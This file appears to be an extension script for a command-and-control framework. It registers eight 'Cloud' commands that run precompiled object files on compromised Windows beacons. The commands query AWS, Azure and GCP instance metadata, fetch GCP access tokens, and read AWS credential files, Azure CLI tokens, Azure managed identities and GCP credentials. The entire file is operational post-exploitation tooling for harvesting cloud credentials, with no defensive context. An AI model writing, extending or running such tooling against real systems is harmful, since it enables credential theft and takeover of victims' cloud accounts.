var metadata = {
    name: "Cloud-BOF",
    description: "Cloud enumeration: AWS/Azure/GCP metadata, credentials, tokens"
};

var aws_meta = ax.create_command("cloud-aws-meta", "Fetch AWS EC2 instance metadata", "cloud-aws-meta");
aws_meta.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int,str", [0, ""]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: AWS Metadata");
});

var azure_meta = ax.create_command("cloud-azure-meta", "Fetch Azure instance metadata", "cloud-azure-meta");
azure_meta.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int,str", [1, ""]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Azure Metadata");
});

var gcp_meta = ax.create_command("cloud-gcp-meta", "Fetch GCP access token", "cloud-gcp-meta");
gcp_meta.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int,str", [2, ""]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: GCP Metadata");
});

var cloud_all = ax.create_command("cloud-all", "Check all cloud metadata endpoints", "cloud-all");
cloud_all.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int,str", [3, ""]);
    let bof = ax.script_dir() + "_bin/metadata." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: All Cloud Metadata");
});

var azure_id = ax.create_command("cloud-azure-identity", "Check Azure managed identity", "cloud-azure-identity");
azure_id.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [0]);
    let bof = ax.script_dir() + "_bin/credentials." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Azure Identity");
});

var aws_creds = ax.create_command("cloud-aws-creds", "Read AWS credentials file", "cloud-aws-creds");
aws_creds.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [1]);
    let bof = ax.script_dir() + "_bin/credentials." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: AWS Credentials");
});

var azure_tokens = ax.create_command("cloud-azure-tokens", "Read Azure CLI tokens", "cloud-azure-tokens");
azure_tokens.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [2]);
    let bof = ax.script_dir() + "_bin/credentials." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: Azure Tokens");
});

var gcp_creds = ax.create_command("cloud-gcp-creds", "Read GCP credentials", "cloud-gcp-creds");
gcp_creds.setPreHook(function(id, cmdline, parsed) {
    let params = ax.bof_pack("int", [3]);
    let bof = ax.script_dir() + "_bin/credentials." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof}" ${params}`, "Task: GCP Credentials");
});

var group = ax.create_commands_group("Cloud", [aws_meta, azure_meta, gcp_meta, cloud_all, azure_id, aws_creds, azure_tokens, gcp_creds]);
ax.register_commands_group(group, ["beacon", "beacon9090"], ["windows"], []);
